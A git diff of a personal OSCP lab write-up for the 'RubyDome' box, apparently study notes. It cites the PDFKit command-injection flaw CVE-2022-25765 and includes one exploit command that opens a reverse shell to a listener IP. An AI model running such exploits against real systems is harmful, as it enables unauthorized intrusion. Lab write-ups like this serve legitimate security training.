@@ -4,9 +4,9 @@ created: 2026-01-26
 updated: 2025-10-02
 status: seed
 draft: false
-Related: "[[Cybersecurity]]"
 tags:
   - Cybersecurity
+Related: "[[Cybersecurity]]"
 ---
 # RubyDome
 Frustrating that a couple of key points in this box were only broken through with the use of the walkthrough. Throwing `127.0.0.1` into the website to break it was a new one (something to keep in mind for the future) but I'd have never worked out without the walkthrough. 
@@ -67,7 +67,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ---
 # Exploitation
 ## Command Injection
-PDFKit 0.8.6 is vulnerable to command injection (CVE-2022â€“25765), then identified exploit `51293.py` is available to use command injection to create a reverse shell.
+PDFKit 0.8.6 is vulnerable to command injection (CVE-2022–25765), then identified exploit `51293.py` is available to use command injection to create a reverse shell.
 - Ran exploit command;
   `python3 51293.py -s 192.168.45.175 80 -w http://192.168.228.22:3000/pdf -p url`
   ![OSCP - RubyDome - Linux - image4](/files/OSCP%20-%20RubyDome%20-%20Linux%20-%20image4.png)
